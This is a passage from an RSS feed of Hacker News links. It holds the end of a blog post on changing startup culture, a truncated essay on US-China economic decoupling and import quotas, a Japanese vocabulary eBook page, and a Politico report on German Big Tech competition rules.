<p><strong><img src="https://www.purpose.jobs/hs-fs/hubfs/startups%20people%20working.png?width=1389&amp;name=startups%20people%20working.png" alt="startups people working" width="1389" srcset="https://www.purpose.jobs/hs-fs/hubfs/startups%20people%20working.png?width=695&amp;name=startups%20people%20working.png 695w, https://www.purpose.jobs/hs-fs/hubfs/startups%20people%20working.png?width=1389&amp;name=startups%20people%20working.png 1389w, https://www.purpose.jobs/hs-fs/hubfs/startups%20people%20working.png?width=2084&amp;name=startups%20people%20working.png 2084w, https://www.purpose.jobs/hs-fs/hubfs/startups%20people%20working.png?width=2778&amp;name=startups%20people%20working.png 2778w, https://www.purpose.jobs/hs-fs/hubfs/startups%20people%20working.png?width=3473&amp;name=startups%20people%20working.png 3473w, https://www.purpose.jobs/hs-fs/hubfs/startups%20people%20working.png?width=4167&amp;name=startups%20people%20working.png 4167w" sizes="(max-width: 1389px) 100vw, 1389px"><br></strong></p>

<h3><strong>So how do we do this? Where do we look?</strong></h3>
<p>I know of two places to look. One is hard for one reason, and one is hard for another.</p>
<h3>1. Look inside your company</h3>
<p>Anonymous surveys are a great tool to understand how your culture is viewed by your employees. Anonymity is key, lest you get a bunch of sunshine blown up your butt. We built our own survey based on specific questions we had at my previous company, but a<span>&nbsp;</span><a href="https://www.google.com/search?q=culture+surveys&amp;rlz=1C5CHFA_enUS840US840&amp;oq=culture+surveys&amp;aqs=chrome..69i57j0j0i22i30j0i22i30i395l7.2476j1j4&amp;sourceid=chrome&amp;ie=UTF-8" rel="noopener" target="_blank">quick google search</a><span>&nbsp;</span>will give you many more options to choose from.</p>
<p>There is risk to this approach, however. A survey like this communicates to your employees that you understand the importance of culture, and that you will presumably listen to what they say and attempt to address it. If you take this route and do nothing to address the feedback afterward, it can cause the kind of harm we discussed above. This is a genie that is difficult to put back into the bottle.</p>
<br>
<h3>2. Look inside yourself</h3>
<p>At some point in every entrepreneur‚Äôs journey they realize that their company is simply a manifestation of their personality. The good and the bad. No matter what‚Äôs on the walls, the behavior of the leader dictates the culture. This presents a shortcut, in that you can understand your corporate culture by understanding yourself.</p>
<p>Are you late to meetings? That‚Äôs your culture. Others are late, too. Do you hold yourself to the grindstone, sacrificing holidays to make more progress? That‚Äôs your culture. Others do that, too. Do you pass the buck and blame others when things go wrong? You get the picture.</p>
<p>While most entrepreneurs resist the hell out of this (it‚Äôs scary considering your foundational role in creating the problem you see in everyone else), in my experience looking internally is the most reliable route to determine your culture. For those brave few, it‚Äôs best done with either a 360-degree survey, allowing you to get feedback from all your colleagues, or a dedicated coach to help you see your blindspots.</p>
<p><a href="https://www.purpose.jobs/blog/the-dark-side-of-crushing-it" rel="noopener" target="_blank"><img src="https://www.purpose.jobs/hs-fs/hubfs/More%20from%20Ryan%20Vaughn%20(1).png?width=1600&amp;name=More%20from%20Ryan%20Vaughn%20(1).png" alt="More from Ryan Vaughn (1)" width="1600" srcset="https://www.purpose.jobs/hs-fs/hubfs/More%20from%20Ryan%20Vaughn%20(1).png?width=800&amp;name=More%20from%20Ryan%20Vaughn%20(1).png 800w, https://www.purpose.jobs/hs-fs/hubfs/More%20from%20Ryan%20Vaughn%20(1).png?width=1600&amp;name=More%20from%20Ryan%20Vaughn%20(1).png 1600w, https://www.purpose.jobs/hs-fs/hubfs/More%20from%20Ryan%20Vaughn%20(1).png?width=2400&amp;name=More%20from%20Ryan%20Vaughn%20(1).png 2400w, https://www.purpose.jobs/hs-fs/hubfs/More%20from%20Ryan%20Vaughn%20(1).png?width=3200&amp;name=More%20from%20Ryan%20Vaughn%20(1).png 3200w, https://www.purpose.jobs/hs-fs/hubfs/More%20from%20Ryan%20Vaughn%20(1).png?width=4000&amp;name=More%20from%20Ryan%20Vaughn%20(1).png 4000w, https://www.purpose.jobs/hs-fs/hubfs/More%20from%20Ryan%20Vaughn%20(1).png?width=4800&amp;name=More%20from%20Ryan%20Vaughn%20(1).png 4800w" sizes="(max-width: 1600px) 100vw, 1600px"></a></p>

<p><strong>I‚Äôve reconciled with my current culture. Now what?</strong></p>
<p>No matter which discovery route you take, how you get to an understanding of your current state of affairs, the process of changing a corporate culture without hurting the business is always the same:</p>
<blockquote>
<p><strong>Step 1:</strong> Change yourself such that you live the values by which you want the company to live.</p>
<p><strong>Step 2:</strong> Write the values by which you live on the wall.</p>
</blockquote>
<p>And if you‚Äôre wondering, yes that‚Äôs what we did to transform our culture at speed.</p>
<p>1. We looked in the mirror as a leadership team (me especially)</p>
<p>2. We talked openly about the pimples we saw there</p>
<p>3. We made commitments to act differently</p>
<p>4. We acted differently</p>
<p>5. Our culture changed</p>

<p>Nobody said it was easy.</p>

<h3>About <a href="https://www.purpose.jobs/blog/author/ryan-vaughn" rel="noopener" target="_blank">Ryan Vaughn</a>:</h3>
<p><span><img src="https://www.purpose.jobs/hs-fs/hubfs/Me%20Creative%20Mornings.jpg?width=265&amp;name=Me%20Creative%20Mornings.jpg" alt="Me Creative Mornings" width="265" srcset="https://www.purpose.jobs/hs-fs/hubfs/Me%20Creative%20Mornings.jpg?width=133&amp;name=Me%20Creative%20Mornings.jpg 133w, https://www.purpose.jobs/hs-fs/hubfs/Me%20Creative%20Mornings.jpg?width=265&amp;name=Me%20Creative%20Mornings.jpg 265w, https://www.purpose.jobs/hs-fs/hubfs/Me%20Creative%20Mornings.jpg?width=398&amp;name=Me%20Creative%20Mornings.jpg 398w, https://www.purpose.jobs/hs-fs/hubfs/Me%20Creative%20Mornings.jpg?width=530&amp;name=Me%20Creative%20Mornings.jpg 530w, https://www.purpose.jobs/hs-fs/hubfs/Me%20Creative%20Mornings.jpg?width=663&amp;name=Me%20Creative%20Mornings.jpg 663w, https://www.purpose.jobs/hs-fs/hubfs/Me%20Creative%20Mornings.jpg?width=795&amp;name=Me%20Creative%20Mornings.jpg 795w" sizes="(max-width: 265px) 100vw, 265px"></span></p>
<p>Ryan is a leadership coach to entrepreneurs, the founder of <a href="https://www.leadinsideout.io/" rel="noopener" target="_blank"><span>Inside Out Leadership</span></a>, and a serial entrepreneur.&nbsp; He has helped leaders from dozens of companies design a more conscious life, and make key changes to improve their performance and satisfaction.&nbsp;<span></span></p>
<p>Previously, as a 3x founder/CEO, Ryan scaled companies to over 11-million users across 45 states, raised over $20m from leading VCs, built teams of nearly 100 world-class employees, and acquired or partnered with nearly a dozen companies.</p>
<p><span>If you are interested in accelerating your growth as a leader, <a href="https://www.leadinsideout.io/contact" rel="noopener" target="_blank">reach out to Ryan here</a>. And if you liked this article, you can find more of Ryan's work at <a href="https://www.secondmountainstartup.com/" rel="noopener" target="_blank">Second Mountain Startup</a>, the popular weekly newsletter for purpose-driven entrepreneurs.<br></span></p>

<p><strong>Looking to grow your startup team? Post jobs and start finding the right candidates.&nbsp;</strong><span><!--HubSpot Call-to-Action Code --><span id="hs-cta-wrapper-4bfa3235-435c-4dc9-9c72-7100dcb8f222"><span id="hs-cta-4bfa3235-435c-4dc9-9c72-7100dcb8f222"><!--[if lte IE 8]><div id="hs-cta-ie-element"></div><![endif]--><a href="https://cta-redirect.hubspot.com/cta/redirect/2873777/4bfa3235-435c-4dc9-9c72-7100dcb8f222" target="_blank"><img id="hs-cta-img-4bfa3235-435c-4dc9-9c72-7100dcb8f222" src="https://no-cache.hubspot.com/cta/default/2873777/4bfa3235-435c-4dc9-9c72-7100dcb8f222.png" alt="POST JOBS FOR FREE"></a></span></span><!-- end HubSpot Call-to-Action Code --></span></p></span>
</p>

</div></div>]]>
            </description>
            <link>https://www.purpose.jobs/blog/why-most-culture-work-actually-hurts-your-company</link>
            <guid isPermaLink="false">hacker-news-small-sites-25791209</guid>
            <pubDate>Fri, 15 Jan 2021 14:20:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Economics of Decoupling (including: Chaos Monkey for supply chains?)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25791102">thread link</a>) | @leopold_a
<br/>
January 15, 2021 | https://www.forourposterity.com/the-economics-of-decoupling/ | <a href="https://web.archive.org/web/*/https://www.forourposterity.com/the-economics-of-decoupling/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <p>America finds herself in a peculiar position. At the same time that she is in an increasingly tense geopolitical standoff with China, her economy remains deeply dependent on China for everything from pharmaceuticals to high-tech computing.</p><p>This disconnect between political and economic realms has led to increasing calls for ‚Äúdecoupling‚Äù: disentangling the economic ties between the US and China. Classical liberals and economists tend to instinctively recoil at such suggestions. Not only is the economic logic of free trade unassailable, they claim, but economic entanglement helps prevent war as well.</p><p>But as the prospect of US-China war becomes ever-less remote, it is worth taking seriously the security vulnerability that comes with America‚Äôs dependence on China. If war were to erupt, could China cut the US off from essential resources and goods, suffocating not only America‚Äôs economy but her war effort itself? The US‚Äôs inability to produce N95 masks during the pandemic‚Äîbecause <a href="https://palladiummag.com/2020/03/22/digital-salon-with-william-eden-and-matt-parlmer-coronavirus-response/">most of the world‚Äôs polypropylene</a> production is in China‚Äîprovides just a taste of what this could be like.</p><p>A liberalism that clings too unreservedly to the ideals of free trade will be a liberalism unable to defend itself. The few percentage points of GDP we gain by offshoring production to China is dwarfed by the catastrophe that would be losing WWIII. And as demonstrated by Japan‚Äôs dependence on the US before WWII, economic dependence doesn‚Äôt even necessarily deter war‚Äîin fact, dependence could spur war.</p><p>But ‚Äúdecoupling‚Äù is no more than a buzzword. The US‚Äôs economic entanglement with China is decades in the making and would be impossible to unravel overnight. Nor is simply reducing the gross volume of imports the right goal. Rather, we should systematically address the specific security vulnerability our economic dependence on China creates. Should it come to war, America‚Äôs supply chains must be robust enough to do without Chinese imports‚Äîeven if the war is long and general.</p><p>Addressing this security vulnerability would require long-run investments in the capabilities and physical factory capacity to produce many vital goods domestically. (Or in allied countries, but I will omit this caveat henceforth for simplicity.) The question is, how to incentivize this adjustment process?</p><p>Ideally, we could directly target the ‚Äúsecurity externality‚Äù of trade. But we run into a fundamental informational problem. In the complex web of modern supply chains, how do we know which imports create vulnerability? While for some imports this may be obvious, there might also be ‚ÄúAchilles‚Äô heel‚Äù imports: random, $5 components that nobody thinks about, but that turn out to be essential, and for which the production expertise and facilities do not exist in the United States.</p><p>The ‚Äúdecouplers‚Äù seem to retreat to the canonical approach to trade restriction: tariffs. The problem with tariffs, however, is that they are royally ineffective at reducing the security vulnerability we are concerned about. A general tariff incentivizes onshoring the production that is cheapest and easiest to onshore‚Äîbut it is likely the imports for which onshoring would be the most expensive and difficult that present the greatest security vulnerability, as I will explain. In the language of economics, I argue that the imports that present the greatest security vulnerability are those with the most inelastic import demand‚Äîwhile a general tariff most reduces those imports with the most elastic import demand.</p><p>I propose an alternative approach: general per-product quotas. These would better target vulnerability than a general tariff. Perhaps even more importantly, this mechanism would reveal critical information about which imports are associated with the greatest vulnerability. Using this information, the government could then directly tax this vulnerability or subsidize domestic production alternatives. In that sense, the per-product quotas could function as a ‚Äústress test‚Äù of the robustness of American supply chains to disruptions in the flow of Chinese imports.</p><p>Note that even if you disagree with the premise that we ought to ‚Äúdecouple,‚Äù I invite you to consider this economic question. Whether you like it or not, decoupling may become the political mandate‚Äîand so, as economists, we ought to figure out how to best execute on that political mandate (rather than hiding behind the dogma ‚Äúbut free trade is good!‚Äù).</p><h2 id="conceptualizing-the-security-vulnerability">Conceptualizing the Security Vulnerability</h2><p>Suppose the imports of a certain good were completely cut off. How bad would that be? That is what I shall term the ‚Äúvulnerability‚Äù associated with importing that good.</p><p>Vulnerability depends on two factors:</p><ul><li>1) How essential the good is, and</li><li>2) How difficult replacing the import with domestic production would be.</li></ul><p>If suddenly our supply of nonessential goods‚Äîsay, random gizmos like Rubik‚Äôs cubes‚Äîwere cut off, that would be a bummer. But losing access to Rubik‚Äôs cubes would not be of greater relevance for the US economy or a potential war effort. By contrast, a critical component in microchip production would be more essential, for example.</p><p>Some imports may be essential, but the imports may be easily substituted by domestic production if necessary. For these goods, we might as well harvest the cost savings of offshoring during peacetime, and if necessary we could switch to emergency domestic production.</p><p>The imports we really should be worried about on security vulnerability grounds are those that are both essential <em>and</em> difficult to replace with domestic production. These might be imports like rare earths. If our rare earth supply were cut off, that could arrest our ability to procure new computer systems‚Äîand it would likely also be expensive, time-consuming, and difficult to establish alternative domestic production.</p><p>Critically, the degree of vulnerability associated with an import‚Äîwhether it is nonessential or essential, whether it easily substituted by domestic production or not‚Äîis not reflected in its price. The dollar volume of rare earth imports from China is a fraction of the dollar volume of toy imports from China, for example. So we cannot measure the success of ‚Äúdecoupling‚Äù by simply looking the dollar volume of trade.</p><h2 id="the-security-vulnerability-in-economic-terms">The Security Vulnerability in Economic Terms</h2><p>We can put our conception of vulnerability in the language of economics by thinking about elasticities. In particular, vulnerability will correspond to inelastic import demand.</p><p>Consider first the two component factors of vulnerability mentioned above.</p><p><strong>Essentiality: Elasticity of General Demand </strong></p><p>The first factor, the essentiality of a good, corresponds to the elasticity of <em>general demand</em> (i.e. demand for the good regardless of source, whether foreign or domestic). The more inelastic general demand, the more buyers are willing to pay to continue procuring the good, so the more essential it is. If a good is nonessential, the more elastic general demand will be, as buyers would just forgo using that good altogether if the price got too high.</p><p><strong>Substitutability with Domestic Production: Elasticity of Domestic Supply</strong></p><p>The second factor, the difficulty of replacing the import with domestic production, corresponds to the elasticity of <em>domestic supply</em> of that good. The more elastic domestic supply, the easier and cheaper it would be to purchase more of this good domestically. Whereas inelastic domestic supply corresponds to it being expensive and difficult to procure this good domestically.</p><p>To be sure, some imports may be expensive to onshore (i.e. have inelastic domestic supply) simply because of labor costs, not because the US doesn‚Äôt have the capacity to make these goods in an emergency. But with respect to China, the view that offshoring is primarily about labor costs is outdated. As Steve Jobs <a href="https://www.nytimes.com/2012/01/22/business/apple-america-and-a-squeezed-middle-class.html">once told</a> Obama, iPhones are made in China not because of labor costs but because only China has the requisite manufacturing expertise and the vast industrial scale.</p><p><strong>Vulnerability: Elasticity of Import Demand</strong></p><p>It turns out that the combination of these factors‚Äîi.e., vulnerability itself‚Äîis captured by the elasticity of <em>import demand</em> for the good (i.e., the demand for the good solely from foreign, not domestic, sources). <em>The more inelastic the import demand for a good, the higher the vulnerability associated with importing that good.</em></p><p>To see this, note that the elasticity of import demand captures both the elasticities of general demand and domestic supply. The elasticity of <em>import demand</em> will depend on the elasticity of <em>general demand</em>; if general demand is very elastic, then, straightforwardly, import demand will be very elastic too.</p><p>Critically, the elasticity of <em>import demand</em> will also depend on the elasticity of <em>domestic supply</em>. If domestic supply is very elastic, import demand will be very elastic as well, since buyers would just switch to acquiring the good domestically if the import got too expensive. Whereas if domestic supply is inelastic, there is little alternative to continuing to import the good, so import demand will be inelastic as well.</p><p>Thus, the import demand will be inelastic exactly when vulnerability is high‚Äîwhen the good is both essential (inelastic general demand) and the import is not easily substituted by domestic production (inelastic domestic supply).</p><p>Thus, to reduce the security vulnerability, we want to onshore those goods where the import demand is inelastic, while we care much less about those goods where the import demand is more elastic. Considering this elasticity helps clarify the effect of trade interventions.</p><h2 id="tariffs">Tariffs</h2><p>A tariff most reduces purchases for goods with elastic import demand‚Äîwhile barely touching the quantity of purchases of goods with inelastic import demand. A general tariff on imports from China (~what the Trump Administration did) thus most reduces the imports that present the <em>least</em> security vulnerability, while barely touching the imports that present the greatest security vulnerability.</p><p>To put it in ‚Ä¶</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.forourposterity.com/the-economics-of-decoupling/">https://www.forourposterity.com/the-economics-of-decoupling/</a></em></p>]]>
            </description>
            <link>https://www.forourposterity.com/the-economics-of-decoupling/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25791102</guid>
            <pubDate>Fri, 15 Jan 2021 14:11:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Learn JLPT-N3 Japanese Vocab with Pictures (eBook)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25790627">thread link</a>) | @mhay
<br/>
January 15, 2021 | https://www.kumalearn.com/ebooks/kumadex-jlpt-n3-25-words | <a href="https://web.archive.org/web/*/https://www.kumalearn.com/ebooks/kumadex-jlpt-n3-25-words">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h2>A better way to send money.</h2><dl><div><p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9IiNmZmYiIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTkgMTJjMC0uNTUyLjQ0OC0xIDEuMDAxLTFzLjk5OS40NDguOTk5IDEtLjQ0NiAxLS45OTkgMS0xLjAwMS0uNDQ4LTEuMDAxLTF6bTYuMiAwbC0xLjcgMi42LTEuMy0xLjYtMy4yIDRoMTBsLTMuOC01em01LjgtN3YtMmgtMjF2MTVoMnYtMTNoMTl6bTMgMnYxNGgtMjB2LTE0aDIwem0tMiAyaC0xNnYxMGgxNnYtMTB6Ii8+PC9zdmc+" width="24" alt="Kuma Learn has thousands of words with pictures"></p><p><dt>3,000+ words with pictures</dt><dd>We've carefully hand-picked pictures for thousands of words for you, so that you can learn Japanese visually! We have the ambition to hand-pick pictures for many more thousands of words.</dd></p></div><div><p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9IiNmZmYiIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTggMTAuNWMwIC44MjctLjY3MyAxLjUtMS41IDEuNXMtMS41LS42NzMtMS41LTEuNS42NzMtMS41IDEuNS0xLjUgMS41LjY3MyAxLjUgMS41em0xNiA2LjIxNmMwIDEuNTg3LS41NiAyLjU5MS0xLjc0OSAzLjE3OS0uMTQzLjA3MS0uMjk2LjEwNS0uNDQ5LjEwNS0uMjQyIDAtLjQ4Mi0uMDg3LS42NzItLjI1NWwtMy4xMDktMi43NDVjLS41NTgtLjQ5NC0xLjA0NC0xLjAwNC0yLjQwNC0xLjAwNGgtNy4yMzNjLTEuMzYgMC0xLjg0Ny41MS0yLjQwNCAxLjAwNGwtMy4xMSAyLjc0NWMtLjE4OC4xNjgtLjQyOS4yNTUtLjY3Mi4yNTUtLjE1MiAwLS4zMDctLjAzNC0uNDQ5LS4xMDUtMS4xODktLjU4OC0xLjc0OS0xLjU5Mi0xLjc0OS0zLjE3OCAwLTIuMDYyLjk0NS01LjQ2MSAyLjY4MS05Ljg1Ny44MjItMi4wODMgMi4yOTItMi44NiAzLjY5NS0yLjg2LjY1NiAwIDEuMjk4LjE3IDEuODUzLjQ1NiAyLjQyNCAxLjI0OSA1LjE3IDEuMjIzIDcuNTQ0IDAgLjU1My0uMjg2IDEuMTk1LS40NTYgMS44NTEtLjQ1NiAxLjQwMyAwIDIuODc0Ljc3NyAzLjY5NiAyLjg2IDEuNzM1IDQuMzk1IDIuNjggNy43OTQgMi42OCA5Ljg1NnptLTE1LTYuMjE2YzAtMS4zODEtMS4xMTktMi41LTIuNS0yLjVzLTIuNSAxLjExOS0yLjUgMi41IDEuMTE5IDIuNSAyLjUgMi41IDIuNS0xLjExOSAyLjUtMi41em00LTIuNWMwLS41NTItLjQ0Ny0xLTEtMXMtMSAuNDQ4LTEgMSAuNDQ3IDEgMSAxIDEtLjQ0OCAxLTF6bTMuNSAyLjVjMC0uNDE1LS4zMzYtLjc1LS43NS0uNzVzLS43NS4zMzUtLjc1Ljc1LjMzNi43NS43NS43NS43NS0uMzM1Ljc1LS43NXptMS43NSAxLjc1YzAtLjQxNS0uMzM2LS43NS0uNzUtLjc1cy0uNzUuMzM1LS43NS43NS4zMzYuNzUuNzUuNzUuNzUtLjMzNS43NS0uNzV6bTAtMy41MzFjMC0uNDE1LS4zMzYtLjc1LS43NS0uNzVzLS43NS4zMzUtLjc1Ljc1LjMzNi43NS43NS43NS43NS0uMzM2Ljc1LS43NXptMS43MzQgMS43ODFjMC0uNDE1LS4zMzYtLjc1LS43NS0uNzVzLS43NS4zMzUtLjc1Ljc1LjMzNi43NS43NS43NS43NS0uMzM1Ljc1LS43NXoiLz48L3N2Zz4=" width="24" alt="Kuma Learn makes learning fun with games"></p><p><dt>Make learning fun!</dt><dd>Learning Japanese vocabulary with pictures certainly helps but we have plans to make it more fun by introducing games with pictures. Match words with pictures, guess a word from a picture and more!</dd></p></div><div><p><img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMjJweCIgaGVpZ2h0PSIyNHB4IiB2aWV3Qm94PSIwIDAgMjIgMjQiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8dGl0bGU+bGVhcm48L3RpdGxlPgogICAgPGcgaWQ9IlBhZ2UtMSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgPGcgaWQ9ImxlYXJuIiBmaWxsPSIjRkZGRkZGIj4KICAgICAgICAgICAgPHBhdGggZD0iTTE0Ljk5NiwyMy45OTkgTDIuMzkxLDIzLjk5OSBDMi4zOTEsMjMuOTk5IDMuMTI1LDIwLjA2OCAzLjAyNCwxOC4zMTMgQzIuOTgzLDE3LjU4OSAyLjg2MywxNi44MzkgMi40ODQsMTYuMjA5IEMxLjgzOSwxNS4yMDkgLTAuMTUyLDEyLjQ4OSAwLjAwOSw4Ljc3OSBDMC4yMzMsMy41NyA0LjcwMiwwIDEwLjEzNSwwIEMxNS4yMzMsMCAxOC42NDIsMy4wMDEgMTkuOTkzLDcuNDgzIEMyMC4zMjEsOC41NjIgMjAuMzA0LDkuMDI0IDE5Ljg0MiwxMC4wOSBMMTkuODM2LDEwLjEwMyBMMjEuNTg3LDEyLjI0NSBDMjEuODQ3LDEyLjYyNiAyMiwxMy4wMzYgMjIsMTMuNDg0IEMyMiwxNC4wMzEgMjEuNzY3LDE0LjUyOSAyMS4zOSwxNC44ODMgQzIxLjAyMiwxNS4yMjggMjAuNjIzLDE1LjMzNSAyMC4xNDIsMTUuNTI1IEMyMC4xNDIsMTUuNTI1IDE5LjU2NiwxOC4xMTcgMTkuMjY5LDE4LjgxNiBDMTguNTY5LDIwLjQ1OSAxNy4yOTksMjAuNDc1IDE2LjI5OSwyMC42NjUgQzE1LjkwNSwyMC43NDggMTUuODA5LDIwLjc5OCAxNS42MTgsMjEuMzQ2IEMxNS40MSwyMS45MzcgMTUuMjU1LDIyLjc4MSAxNC45OTYsMjMuOTk5IE0xMC4xNTQsMS45OTkgQzUuODY5LDIuMDQ3IDIuNDE0LDQuNTQ3IDIuMDMzLDguNDg3IEMxLjg0MSwxMC40NzggMi40OTYsMTIuNDczIDMuNTQ5LDE0LjE5MiBDNC4xNiwxNS4xOTIgNC44NTQsMTUuNzg0IDUuMDEzLDE4LjA2NyBDNS4xMDQsMTkuMzggNC45NjMsMjAuNzAzIDQuNzcyLDIxLjk5OSBMMTMuMzc2LDIxLjk5OSBDMTMuNTE3LDIxLjM1NCAxMy43MjYsMjAuNTE0IDE0LjA2MywxOS45NDIgQzE0LjUxMiwxOS4xNzYgMTUuMTYsMTguODQzIDE1Ljk4OSwxOC42ODggQzE2LjgyNywxOC41NCAxNy4yMjcsMTguNjI5IDE3LjQ3OCwxNy45MDMgQzE3LjY5LDE3LjMyNCAxOC4wOSwxNS42ODIgMTguMzA5LDE0LjAwMSBDMTkuNTEyLDEzLjY2NiAxOC45MjEsMTMuODQgMTkuOTgsMTMuNDQyIEMxOS43NzQsMTMuMjA4IDE4LjA2MiwxMS4xMjggMTcuOTM1LDEwLjg0MiBDMTcuNTk5LDEwLjA4MyAxNy44ODksOS42NTIgMTguMTYsOC45MjkgQzE4LjI0Niw4LjY3OCAxOC4yMiw4LjU3MiAxOC4xNTEsOC4zMTYgQzE3LjEwMiw0LjM2NyAxNC4yNiwxLjk5OSAxMC4xNTQsMS45OTkgTTEwLjY3NCw0Ljk5OSBDMTAuOTE2LDUuNjgzIDEwLjk4Niw2LjEyMSAxMS41MTUsNi4zNCBMMTEuNTE2LDYuMzQgQzEyLjA0Niw2LjU2MSAxMi40MDksNi4yOTYgMTMuMDU5LDUuOTg3IEwxNC4wMTIsNi45MzkgQzEzLjcsNy41OTQgMTMuNDM5LDcuOTU1IDEzLjY1OCw4LjQ4MyBMMTMuNjU4LDguNDg0IEMxMy44NzcsOS4wMTIgMTQuMzExLDkuMDgxIDE1LDkuMzI1IEwxNSwxMC42NzIgQzE0LjMxOSwxMC45MTUgMTMuODc3LDEwLjk4NSAxMy42NTgsMTEuNTE1IEMxMy40MzgsMTIuMDQ0IDEzLjcwMSwxMi40MDYgMTQuMDEyLDEzLjA1OSBMMTMuMDU5LDE0LjAxMSBDMTIuNDAyLDEzLjY5OCAxMi4wNDUsMTMuNDM3IDExLjUxOCwxMy42NTYgTDExLjUxNywxMy42NTYgQzEwLjk4NiwxMy44NzggMTAuOTE2LDE0LjMxNyAxMC42NzQsMTQuOTk5IEw5LjMyNiwxNC45OTkgQzkuMDg0LDE0LjMxNSA5LjAxNCwxMy44NzcgOC40ODUsMTMuNjU5IEw4LjQ4NCwxMy42NTggQzcuOTU1LDEzLjQzNyA3LjU5MiwxMy43MDEgNi45NCwxNC4wMTEgTDUuOTg4LDEzLjA1OSBDNi4yOTMsMTIuNDE2IDYuNTYyLDEyLjA0OCA2LjM0MSwxMS41MTQgQzYuMTIxLDEwLjk4NSA1LjY4LDEwLjkxNSA1LDEwLjY3MiBMNSw5LjMyNSBDNS42ODEsOS4wODMgNi4xMjEsOS4wMTMgNi4zNDEsOC40ODQgQzYuNTYxLDcuOTUzIDYuMjk5LDcuNTkzIDUuOTg4LDYuOTM5IEw2Ljk0LDUuOTg3IEM3LjU5Nyw2LjI5OSA3Ljk1NSw2LjU2IDguNDg0LDYuMzQgTDguNDg1LDYuMzQgQzkuMDE0LDYuMTIxIDkuMDg0LDUuNjc5IDkuMzI2LDQuOTk5IEwxMC42NzQsNC45OTkgTDEwLjY3NCw0Ljk5OSBaIE0xMCwxMS42NjYgQzkuMDgsMTEuNjY2IDguMzMzLDEwLjkyIDguMzMzLDkuOTk5IEM4LjMzMyw5LjA3OCA5LjA4LDguMzMyIDEwLDguMzMyIEMxMC45Miw4LjMzMiAxMS42NjYsOS4wNzggMTEuNjY2LDkuOTk5IEMxMS42NjYsMTAuOTIgMTAuOTIsMTEuNjY2IDEwLDExLjY2NiIgaWQ9IlNoYXBlIj48L3BhdGg+CiAgICAgICAgPC9nPgogICAgPC9nPgo8L3N2Zz4=" width="24" alt="Kuma Learn helps you learn efficiently with Spaced Repetition System (SRS)"></p><p><dt>Spaced Repetition System (SRS)</dt><dd>Kuma Learn has plans to help you learn Japanese vocabulary efficiently with a Spaced Repetition System (SRS). You'll be shown words that you don't know more often; words know well you'll be shown only every so often.</dd></p></div></dl></div></div></div>]]>
            </description>
            <link>https://www.kumalearn.com/ebooks/kumadex-jlpt-n3-25-words</link>
            <guid isPermaLink="false">hacker-news-small-sites-25790627</guid>
            <pubDate>Fri, 15 Jan 2021 13:22:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Germany shows EU the way in curbing Big Tech]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25790385">thread link</a>) | @doener
<br/>
January 15, 2021 | https://www.politico.eu/article/germany-shows-eu-the-way-in-curbing-big-tech/ | <a href="https://web.archive.org/web/*/https://www.politico.eu/article/germany-shows-eu-the-way-in-curbing-big-tech/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
									
<p>The German parliament on Thursday approved a reform of national competition law that would make Germany the first country in the world with preventative rules tailored to counter the market power of large digital platforms.</p>



<p>In moving forward quickly with the new constraints on Big Tech, Germany is increasing its leverage in the EU's development of a similar bloc-wide reforms that could end up replacing the German framework ‚Äî but Berlin's approach also opens the door to legal challenges by the internet platforms.</p>



<p>Competition authorities traditionally can act only after a company has abused a dominant market position, which has proven a slow and ineffective way of dealing with anticompetitive behavior by digital giants. The <a href="https://www.politico.eu/?p=1573418">new framework</a> will put the German authority ‚Äî the Bundeskartellamt ‚Äî at the forefront when bringing in a new type of competition case, prohibiting<strong> </strong>abusive behavior before it takes place within markets where firms are not yet dominant.</p>



<p>The Bundeskartellamt could start compiling as of March a list of companies considered "of paramount significance on competition across markets." These companies will need to obey a set of rules, including the prohibition against giving preferential treatment to their own services or hindering interoperability with other services. </p>



<p>Falko Mohrs, a lawmaker with the Social Democrat party ‚Äî who is steering the German reform ‚Äî told POLITICO, "We see digital markets need new regulations, more proactive and efficient, when it comes to the big players."</p>



<p>German competition chief Andreas Mundt has highlighted how the coronavirus crisis amplifies<strong> </strong>the winner-takes-all dynamic on digital markets, with so-called gatekeeper platforms exerting outsized influence. "We really need to re-establish conditions for competitive options for companies outside the ecosystems of these huge digital companies," he said in November concerning the planned reform. </p>



<p>The bill was approved in the plenary of the Bundestag on Thursday morning, after a compromise between the country's three governing parties was reached late last week. It should still be approved by the Bundesrat, the legislative body representing Germany's states, but that is a formal step.</p>



